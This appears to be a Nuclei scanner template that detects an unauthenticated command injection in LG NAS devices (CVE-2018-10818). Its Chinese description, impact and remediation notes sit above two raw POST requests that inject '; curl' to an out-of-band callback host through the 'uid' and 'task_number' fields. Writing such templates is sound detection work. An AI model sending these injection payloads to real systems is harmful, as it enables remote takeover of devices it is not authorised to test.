id: lg-nas-rce

info:
  name: LG NAS Devices - 远程代码执行漏洞（CVE-2018-10818）
  author: gy741
  severity: critical
  description: |-
    LG NAS Devices 存在安全漏洞。攻击者可通过 /system/sharedir.php、/en/php/usb_sync.php 的 act, task_number 参数 构造恶意输入，在服务器端执行任意命令或代码。该模板通过请求 /system/sharedir.php、/en/php/usb_sync.php，并结合响应中的 http、User-Agent: {{useragent}} 等特征进行验证。
  impact: |-
    - 攻击者可在目标服务器上执行任意命令或代码，直接接管受影响主机或应用进程。
    - 成功利用后可进一步窃取数据、植入后门、横向移动，或破坏关键业务系统。
  remediation: |-
    - 尽快将 LG NAS Devices 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 避免将外部输入直接传入执行链路，并通过白名单校验、最小权限与隔离运行降低命令执行风险。
  reference:
    - https://www.vpnmentor.com/blog/critical-vulnerability-found-majority-lg-nas-devices/
    - https://medium.com/@0x616163/lg-n1a1-unauthenticated-remote-command-injection-cve-2018-14839-9d2cf760e247
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-10818
  classification:
    cve-id: CVE-2018-14839
    cwe-id: CWE-78
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-score: 0.89354
    epss-percentile: 0.99771
    cpe: cpe:2.3:o:lg:n1a1_firmware:3718.510:*:*:*:*:*:*:*,cpe:2.3:h:lg:n1a1:-:*:*:*:*:*:*:*
  metadata:
    max-request: 2
  tags: lg-nas,rce,oast,injection,vuln
variables:
  useragent: '{{rand_base(6)}}'

http:
  - raw:
      - |
        POST /system/sharedir.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        &uid=10; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'
      - |
        POST /en/php/usb_sync.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        &act=sync&task_number=1;curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: {{useragent}}"
